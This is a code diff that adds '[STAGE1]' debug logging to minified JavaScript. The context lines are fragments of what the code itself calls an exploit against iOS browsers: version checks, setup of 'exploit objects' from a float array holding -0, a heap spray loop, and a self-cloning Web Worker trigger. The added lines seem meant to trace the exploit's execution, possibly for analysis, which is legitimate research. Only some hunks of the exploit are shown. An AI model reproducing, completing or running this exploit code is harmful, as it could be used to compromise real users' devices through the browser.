@@ -22,13 +22,17 @@ async function q(t, e) {
   const r = 1;
   const i = 2;
   const s = 3;
+  let _checkpointCounter = 0;
   const o = (t) => {
     try {
       if (typeof window !== 'undefined' && typeof window.log === 'function') {
-        window.log('[STAGE1] ' + String(t));
+        _checkpointCounter++;
+        const msg = String(t) || ('ckpt_' + _checkpointCounter);
+        window.log('[STAGE1] ' + msg);
       }
     } catch (_) {}
   };
+  window.log('[STAGE1] >>> q() called with iOS version: ' + String(e));
   let l = 170100;
   if (navigator.constructor.name === "Navigator") {
     o("");
@@ -1057,6 +1061,7 @@ async function q(t, e) {
     }
   };
   const ht = async (t) => {
+    window.log("[STAGE1] ht() started - setting up exploit objects");
     o("");
     const e = JSON.parse("[0.0, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 10.10]");
     const c = new ut();
@@ -1065,7 +1070,9 @@ async function q(t, e) {
     e[1] = -0;
     h[0] = c.es;
     h[1] = c.ss;
+    window.log("[STAGE1] ht() - exploit objects created, setting up worker");
     const u = () => {
+      window.log("[STAGE1] ht() - u() called (spray loop)");
       const n = [349234, h, 349234, 1045554, e, 1045554];
       const r = (t, ...e) => {
         try {
@@ -1090,6 +1097,7 @@ async function q(t, e) {
       } else window.setTimeout(u, 0);
     };
     const a = () => {
+      window.log("[STAGE1] a() called - creating worker");
       const t = q.toString();
       const e = "(" + t.toString() + ")()";
       const c = URL.createObjectURL(new Blob([e], {
@@ -1097,6 +1105,7 @@ async function q(t, e) {
       }));
       const h = new Worker(c);
       URL.revokeObjectURL(c);
+      window.log("[STAGE1] a() - worker created, setting up handlers");
       o("");
       h.onerror = (t) => {
         o("");
@@ -1118,6 +1127,7 @@ async function q(t, e) {
         xn: l
       });
     };
+    window.log("[STAGE1] ht() - calling a() to set up and trigger worker");
     a();
   };
   class ut {
@@ -1432,6 +1442,7 @@ async function q(t, e) {
   }
   if (navigator.constructor.name === "Navigator") {
     et();
+    window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
   } else {
     o("");
